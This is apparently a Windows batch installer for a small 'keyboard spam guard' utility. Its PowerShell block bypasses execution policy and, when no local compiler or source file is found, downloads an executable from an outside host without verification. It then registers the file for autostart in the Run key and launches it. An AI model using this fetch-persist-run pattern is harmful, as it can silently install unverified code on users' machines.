@echo off
title Installing Anti-1 Keyboard Spam Guard...
echo ========================================================
echo       Anti-1 Keyboard Spam Guard - Installer
echo ========================================================
echo.
echo Installing and compiling Keyboard Guard...

set TARGET_DIR=%LOCALAPPDATA%\KeyboardGuard
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$csc = (Get-ChildItem 'C:\Windows\Microsoft.NET\Framework64\v4.0.*' -Filter 'csc.exe' -Recurse | Select-Object -First 1).FullName;" ^
    "if (-not $csc) { $csc = (Get-ChildItem 'C:\Windows\Microsoft.NET\Framework\v4.0.*' -Filter 'csc.exe' -Recurse | Select-Object -First 1).FullName; }" ^
    "if (-not $csc) { Write-Host 'C# Compiler not found, downloading binary...'; Invoke-WebRequest -Uri 'https://youuhost.com/AntiOneSpamGuard.exe' -OutFile '%TARGET_DIR%\AntiOneSpamGuard.exe'; } else {" ^
    "   if (Test-Path 'AntiOneSpamGuard.cs') { & $csc /target:winexe /optimize+ /out:'%TARGET_DIR%\AntiOneSpamGuard.exe' AntiOneSpamGuard.cs; }" ^
    "   elseif (Test-Path 'AntiOneSpamGuard.exe') { Copy-Item 'AntiOneSpamGuard.exe' '%TARGET_DIR%\AntiOneSpamGuard.exe' -Force; }" ^
    "   else { Invoke-WebRequest -Uri 'https://youuhost.com/AntiOneSpamGuard.exe' -OutFile '%TARGET_DIR%\AntiOneSpamGuard.exe'; }" ^
    "};" ^
    "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'AntiOneSpamGuard' -Value '\"%TARGET_DIR%\AntiOneSpamGuard.exe\"';" ^
    "Stop-Process -Name 'AntiOneSpamGuard' -Force -ErrorAction SilentlyContinue;" ^
    "Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = '\"%TARGET_DIR%\AntiOneSpamGuard.exe\"'} | Out-Null;"

echo.
echo [SUCCESS] Keyboard Guard is now running in your System Tray!
echo Continuous 111111 repeat spam is now blocked.
echo.
pause
